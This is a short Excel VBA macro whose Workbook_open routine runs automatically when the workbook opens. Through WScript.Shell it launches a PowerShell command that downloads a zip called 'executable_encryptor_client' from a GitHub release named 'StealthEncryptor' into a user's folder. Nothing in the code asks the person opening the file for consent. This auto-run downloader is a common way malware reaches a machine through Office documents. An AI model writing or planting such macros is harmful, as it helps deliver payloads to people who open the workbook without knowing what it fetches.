Private Sub Workbook_open()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    Dim psCmd As String
    psCmd = "powershell -Command iwr -uri https://github.com/dsMpLe/StealthEncryptor/releases/download/v1.0.0/executable_encryptor_client.zip -OutFile C:\Users\denni\executable_encryptor_client.zip"
    shell.Run psCmd, 1, True
End Sub
